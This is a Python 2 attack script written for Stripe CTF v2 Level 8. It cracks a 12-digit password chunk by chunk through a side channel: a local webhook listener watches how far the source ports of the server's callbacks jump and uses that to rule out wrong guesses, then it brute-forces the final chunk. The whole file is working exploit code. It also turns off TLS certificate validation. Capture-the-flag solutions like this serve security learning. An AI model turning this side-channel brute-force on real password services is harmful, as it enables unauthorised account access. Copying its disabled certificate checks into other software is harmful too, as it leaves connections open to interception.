#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Bubba's Stripe CTF v2 Level 8 Chunk Cracker
# (c) 2012 Signature Tech Studio
#
# THIS SOFTWARE IS PROVIDED "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
# AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
#
# IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
# OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
# OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
# EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
api
~~~

Module Contains the tools necessary to crack password chunks in the
Stripe CTF 

@author Bubba Hines <rob@stechstudio.com>
@link http://stechstudio.com
@link https://stripe-ctf.com
@version 1
@copyright: (c) 2012 Signature Tech Studio
@license:   BSD, see LICENSE for more details.

"""
import sqlite3
import time
import json
import httplib2
import socket
import logging
from optparse import OptionParser
from random import choice
import datetime
from urlparse import urlparse
import thread
# Used to determine if this thread is still running
run = 1

class Cracker(object):
    """"A Python Chunk Cracker for Stripe CTF Level 8
    
    """
    
    def __init__(self, web_hook_addr, password_server, logger):
        """ Initialization for our Cracker Class
        
        Parameters:
        web_hook_addr -- The address for our webhook listener
        web_hook_port -- The port for our webhook listener
        password_server -- The Password Server we are targeting
        logger        -- A logger for our usage
        
        """

        self.logger = logger
        
        ''' Lets setup the Webhook Server first '''
        self.wh_addr = web_hook_addr
        self.wh_port = 49156 
        self.wh_socket = self._fetch_socket()
        self.webhook = '%s:%i' % (self.wh_addr, self.wh_port)
        
        ''' The Primary Passwor Server '''
        self.pw_server = password_server
        urlp = urlparse(self.pw_server)
        self.pw_scheme = urlp.scheme
        self.pw_netloc = urlp.netloc
        self.pw_path = urlp.path
        
        self.log_info("[*] Started L8 CTF Attack Script on %s", self.webhook)
        self.wh_socket.listen(1)

        self.chunk1 = '000'
        self.chunk2 = '000'
        self.chunk3 = '000'
        self.chunk4 = '000'
        self.chunk_curr = 1
        self.flag = None
        
        while self.chunk_curr < 4:
            if self._solveChunk(): self._printSolved()
            
        if self._solveFlag():
            self._printSolved()
            self.log_info("Captured Flag: %s" , self.flag)
        else:
            self.log_crit("Something Went Horridly wrong! We got here with no solution!?")
            exit(1)
        
    def _printSolved(self):
        if self.flag is not None:
            self.log_info("Solved Chunk #1 = %s" , self.chunk1)
            self.log_info("Solved Chunk #2 = %s" , self.chunk2)
            self.log_info("Solved Chunk #3 = %s" , self.chunk3)
            self.log_info("Solved Chunk #4 = %s" , self.chunk4)
            return
        if self.chunk_curr == 2:
            self.log_info("Solved Chunk #1 = %s" , self.chunk1)
            return
        if self.chunk_curr == 3:
            self.log_info("Solved Chunk #1 = %s" , self.chunk1)
            self.log_info("Solved Chunk #2 = %s" , self.chunk2)
            return
        if self.chunk_curr == 4:
            self.log_info("Solved Chunk #1 = %s" , self.chunk1)
            self.log_info("Solved Chunk #2 = %s" , self.chunk2)
            self.log_info("Solved Chunk #3 = %s" , self.chunk3)
            return
    
    def _solveFlag(self):
        self.log_info("[*] Beginning L8 CTF Attack Script on Chunk #%s", self.chunk_curr)
        # A fresh connection to use
        conn = self._makeConnection()
        # This will actually give us a list of 0-999
        guesslist = range(0, 1000)

        while len(guesslist) > 0:
            # Get a random guess from the list
            i = choice(guesslist)
            # Remove it from the list
            guesslist[:] = [x for x in guesslist if not x == i]
            
            try:
                issolution = self.pingPwdServer(conn, i)
            except Exception as e:
                self.log_debug(str(e))
                continue
            
            if not issolution : 
                self.chunk_curr += 1
                return True
            else:
                continue
        
    
    def _solveChunk(self):
        self.log_info("[*] Beginning L8 CTF Attack Script on Chunk #%s", self.chunk_curr)
        # A fresh connection to use
        conn = self._makeConnection()
        
        # A list of known bad guesses to avoid
        bad_guesses = []
        
        # A list of found Bad Guesses to add to the DB
        bad_guess_updates = []
        
        # A list of possible good guesses
        good_guesses = []
        
        # Hit the server in order to initialize last port
        try:
            self.pingPwdServer(conn, 0)
        except Exception as e:
            self.log_debug(str(e))
            
        self.lastport = self.catchWebHook()
         
        # While we have less than 999 TRUE FALSE chunks, 
        # or if we don't have a single good chunk
        while len(bad_guesses) < 999 or len(good_guesses) != 1:
            # This will actually give us a list of 0-999
            guesslist = range(0, 1000)

            while len(guesslist) > 0:
                # Get a randoms guess from the list
                i = choice(guesslist)
                
                if len(guesslist) == 1:
                    return self.solvedChunk(bad_guess_updates, self._zeropad(i), conn)
                
                if self.isKnownBadGuess(i, bad_guesses): 
                    continue
                
                try:
                    isbad = self.verifyBadGuess(conn, i)
                except Exception as e:
                    self.log_debug(str(e))
                    continue
                
                # If the delta is a known bad    
                if isbad:
                    # Store it in the bad lists
                    bad_guesses.append(i)
                    bad_guess_updates.append(i)

                    # This removes the item (i) from the list (guesslist)
                    guesslist[:] = [x for x in guesslist if not x == i]
                
                # Well that wasn't a bad delta, did it match a good delta?    
                elif self.isPossibleDelta(self.lastdelta):
                    # Then we should test that!
                    try:
                        isgood = self.verifyGoodGuess(conn, i, len(bad_guesses))
                    except Exception as e:
                        self.log_debug(str(e))
                        continue
                
                    if isgood:
                        return self.solvedChunk(bad_guess_updates, self._zeropad(i), conn)
                
                # If we have found more than 25 Positive Bad guesses,
                # lets do some cleanup and persisting
                if len(bad_guess_updates) > 25:
                    # Close the old Connection
                    #conn.close()
                    # Obtain a fresh connection to use
                    #conn = self._makeConnection()
                    # Persist our Bad Guesses
                    #self.persistBadGuesses(bad_guess_updates)
                    bad_guess_updates = []
                    self.progressIndication(bad_guesses)

            # Looks Like we finished that loop. (I hate python, how the heck do you know!?)
            self.log_info("[*] Found %i known bad guesses and %i possible good guesses", len(bad_guesses), len(good_guesses))

            for chunk in good_guesses:
                self.log_debug("[*] \t - %s", chunk)
            
            # Reset good Guesses?
            if len(good_guesses) > 1:
                good_guesses = []
        
        # And there is the end of the While Loop, whew! Who knew?
        return self.solvedChunk(bad_guess_updates, good_guesses[0], conn)
                
    ####################
    #
    #  Utility Functions
    #
    ####################
    
    def solvedChunk(self, bad_guess_updates, solution, conn):
        self.updateChunkSolutions(solution)
        self.chunk_curr += 1
        return True
        
    def verifyGoodGuess(self, conn, i, bad):
        # Get a bad guess to start with
        # a known bad last port
        self.getDelta(conn, bad)
       
        # Lets get 10 quick hits to start with
        attempts = []
        for x in range(1, 11):
            delta = self.getDelta(conn, i)
            attempts.append(delta)
            # if the Delta Matches the chunks known
            # bad delta, we are not Good!
            if self.isBadDelta(delta): return False

        possible = 0
        for delta in attempts:
            if self.isPossibleDelta(delta): possible += 1
            
        certainty = float(possible) / len(attempts)
        
        if certainty > .9: return True
        else: return False
    
    def verifyBadGuess(self, conn, i):
        return self.isBadDelta(self.getDelta(conn, i))
        
    def isPossibleDelta(self, delta):
        if self.isBadDelta(delta):
            return False
        elif int(delta) == self._getDelta() + 1:
            return True
            
        
    def isBadDelta(self, delta):       
        # if the Delta Matches the chunks known
        # bad delta, we are true bad!
        if int(delta) == int(self._getDelta()):
            return True;
        else:
            return False;
    
    
    def getDelta(self, conn, i):
        # Ping Server
        self.pingPwdServer(conn, i)
        # Grab the return port
        currentport = self.catchWebHook()
        # What is the delta for the first shot?
        self.lastdelta = currentport - self.lastport
        # Set the new last port
        self.lastport = currentport
        # Return the delta
        return self.lastdelta
        
    
    def updateChunkSolutions(self, guess):
        if self.chunk_curr == 1 : self.chunk1 = guess
        if self.chunk_curr == 2 : self.chunk2 = guess
        if self.chunk_curr == 3 : self.chunk3 = guess
        if self.chunk_curr == 4 : self.chunk4 = guess

    
    def progressIndication(self, bad_guesses):
        total = 999
        current = len(bad_guesses)
        if current > 0 :
            fp = (current / float(total)) * 100
        else:
            fp = 0
        
        precentage = '%.2f%%' % fp
        self.log_info("[*] %s of Chunk #%s bad guesses verified ", precentage, self.chunk_curr)
        
    def isKnownBadGuess(self, num, bad_guesses):
        # Loop Through the known bad guesses
        for bad_guess in bad_guesses:
            bad_guess = int(bad_guess)
            # If this matches any
            if num == bad_guess:
                # return True
                return True
            
        #Otherwise, it's not a known bad
        return False
                    
                    
    def pingPwdServer(self, conn, num):

        jdata = self._getJdata(num)
        resp, content = conn.request(self.pw_server, "POST", jdata)

                
        if self.chunk_curr == 4:
            payload = json.loads(content)
            if payload['success']:
                self.updateChunkSolutions(self._zeropad(num))
                self.flag = self._fetchGuess(num)
                return False
            else:
                return True
        else:
            return True
        
                
    def catchWebHook(self):
        """ Used to catch webhook connections, and returns the port """
        try:
            conn, addr = self.wh_socket.accept()
            port = addr[1]
            #self.wh_socket.sendall('200 OK')
            conn.close()
        except:
            port = 0
        return port

    
    def _fetchGuess(self, digit):
        """ Use the mask to generate a guess for this digit """
        return self._getMask() % str(self._zeropad(digit))
    
    def _makeConnection(self):
        conn = httplib2.Http(disable_ssl_certificate_validation=True)
        """ Make me a new connection """
        #if self.pw_scheme == 'http':
        #    conn = httplib.HTTPConnection(self.pw_netloc)
        # else:
        #    conn = httplib.HTTPSConnection(self.pw_netloc)
        #conn.debuglevel = 0
        return conn
    
    def db_select(self, table, where=None):
        if where is None:
            where = {}
        self.do_select(table, where)
        return map(dict, self.cursor.fetchall())
    
    def do_select(self, table, where=None):
        where = where or {}
        where_clause = ' AND '.join('%s=?' % key for key in where.iterkeys())
        values = where.values()
        q = 'select * from ' + str(table)
        if where_clause:
            q += ' where ' + where_clause
        self.log_debug('%s <== %s', q, values)
        self.cursor.execute(q, values)
        
    
    def _getJdata(self, num):
        """ Get the data in a json format for posting """
        if self.chunk_curr == 4:
            return json.dumps({"password": self._fetchGuess(num), "webhooks":[]})
        else:
            return json.dumps({"password": self._fetchGuess(num), "webhooks":[self.webhook]})
    
    def log_debug(self, *args):
        """ Log detailed information, typically of interest only when diagnosing problems."""
        self.log('debug', *args)
            
    def log_info(self, *args):
        """ Log confirmation that things are working as expected."""
        self.log('info', *args)

    def log_warn(self, *args):
        """ Log an indication that something unexpected happened, or indicative of some problem in the near future (e.g. ‘disk space low’). The software is still working as expected."""
        self.log('warning', *args)
        
    def log_error(self, *args):
        """ Log a more serious problem, the software has not been able to perform some function."""
        self.log('error', *args)

    def log_crit(self, *args):
        """ Log a serious error, indicating that the program itself may be unable to continue running."""
        self.log('critical', *args)
        
    def log(self, level, msg, *args):
        """ This is where we actually do the logging, nothing to see here """
        method = getattr(logger, level)
        interpolated = msg % args
        method(interpolated)    
    
    def _zeropad(self, n, zeros=3):
        """ Pad number n with zeros. Example: zeropad(7,3) == '007' """
        nstr = str(n)
        while len(nstr) < zeros:
            nstr = "0" + nstr
        return nstr

    def _getDb(self):
        """ Get the DB Connection for me """
        self.db = sqlite3.connect(self.dbname, detect_types=sqlite3.PARSE_DECLTYPES)
        self.db.row_factory = sqlite3.Row
        self.cursor = self.db.cursor()
        self.debug = False
    
    def _getMask(self):
        """ Return the current mask we are using """
        if self.chunk_curr == 1:
            return '%s000000000'
        if self.chunk_curr == 2:
            return self.chunk1 + '%s000000'
        if self.chunk_curr == 3:
            return self.chunk1 + self.chunk2 + '%s000'
        if self.chunk_curr == 4:
            return self.chunk1 + self.chunk2 + self.chunk3 + '%s'    
            
    def _getDelta(self):
        """ Get the current offset, a side effect of the
            current chunk is that adding +1 to it gets the offset """        
        return self.chunk_curr + 1
    
    def _fetch_socket(self):
        """ Finding a socket (port) we can connect too. """
        # Sometimes We have problems binding in a crowded environment
        socket.setdefaulttimeout(7)
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) 
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        bound = False
        while not bound:
            try:
                s.bind((self.wh_addr, self.wh_port))
                bound = True
            except socket.error:
                self.wh_port = self.wh_port + 1
        
        return s
    
    def _socket_exists(self, host, port):
        """ Checks to see if a port is open on this IP """
        self.log_debug('Checking whether %s:%s is reachable', host, port)
        try:
            socket.create_connection([host, port])
        except socket.error:
            return False
        else:
            return True
        
    def _find_open_port(self, ip, base_port):
        """ Looks for an open port on the target IP 
            and iterates until it finds one             """
        while self._socket_exists(ip, base_port):
            base_port += 1
        return base_port

def initialize(database):
    """ Initialize the database if we haven't got one """
    
    ''' Skip this if the database file is created alread '''
    if databaseCreated(database):
        return
    
    conn = sqlite3.connect(database, detect_types=sqlite3.PARSE_DECLTYPES)
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute('drop table if exists chunks')
    c.execute('''
    CREATE TABLE chunks(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    chunk int not null,
    guess varchar(3) not null,
    state varchar(10) not null
    )
    ''')
    
def databaseCreated(filename):
    """ Checks to see if the filename exists """
    try:
        with open(filename, 'r') as fp: pass
    except  IOError :
        return False
    else:
        return True
    
def getIP():
    """ Get IP
    
    If we didn't get an IP designated, lets find a handy one to bind to.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    s.connect(('google.com', 0)) 
    return s.getsockname()[0]

def start(ipAddress, primaryServer, logger):
    global run
    try:
        cracker = Cracker(opts.ipAddress, opts.primaryServer, logger)
        
        print "\n"
        print "============================================================="
        print "============================================================="
        print "\n\n"
        print "                         FLAG FOUND"
        print "                        %s                                 \n" % cracker.flag
        print "============================================================="
        print "============================================================="
        end = time.clock()
        total = end - begin
        print "Run completed in %s " % str(datetime.timedelta(seconds=total))
        run = 0
        exit(0)
    except KeyboardInterrupt:
        print '\n\n^C received, shutting down server\n'
        
if __name__ == '__main__':

    
    """ 
    This is where the main processing takes place.
    
    Arguments:
    ipAddress     -- IP Address to bind the Webhook Server too
    primaryServer -- The Primary Password Server. [https://level08-x.stripe-ctf.com/user-xxxxxxxxxx/]
    
    """
    begin = time.clock()
    # Process any arguments    
    parser = OptionParser()
    parser.add_option('-p', '--primaryServer', dest='primaryServer', help='The Primary Password Server. [https://level08-x.stripe-ctf.com/user-xxxxxxxxxx/]')
    parser.add_option('-i', '--ip', dest='ipAddress', help='The ip address we should bind the Webhook Listener to. Will find it if you don\'t specify it.')
    parser.add_option('-q', '--quiet', dest='quiet', help='Don\'t print anything to the console', action='count', default=0)
    parser.add_option('-l', '--logname', dest='logname', help='Customize the path/logname', default=None)
    opts, args = parser.parse_args()

    ''' Setup some logging '''
    if opts.logname is not None:
        logging.basicConfig(level=logging.DEBUG,
                            format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
                            datefmt='%m-%d %H:%M',
                            filename=opts.logname,
                            filemode='w')
        logger = logging.getLogger('chunk_cracker')
    else:
        logging.basicConfig(level=logging.DEBUG,
                            format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s',
                            datefmt='%m-%d %H:%M')
        logger = logging.getLogger('chunk_cracker')
        logger.propagate = False
    
    ''' See if we want to turn off console logging '''
    if not opts.quiet:
        # define a Handler which writes INFO messages or higher to the sys.stderr
        console = logging.StreamHandler()
        # Set the logger debug level
        console.setLevel(logging.DEBUG)
        # set a format which is simpler for console use
        formatter = logging.Formatter('%(name)-12s: %(levelname)-8s %(message)s')
        # tell the handler to use this format
        console.setFormatter(formatter)
        # add the handler to the root logger
        logging.getLogger('chunk_cracker').addHandler(console)
    
    
    logger.debug(opts)
    if opts.ipAddress is None:
        opts.ipAddress = getIP()
    logger.info("Webhook Listener IP Address: %s " % opts.ipAddress)
    logger.info("Primary Password Server = %s" % opts.primaryServer)
        
    # Lets set some arguments
    args = opts.ipAddress, opts.primaryServer, logger
    # And kick off a thread
    thread.start_new_thread(start, args)

    # And realive the cpu a little while we run
    while run:
        time.sleep(0.1)

    exit(0)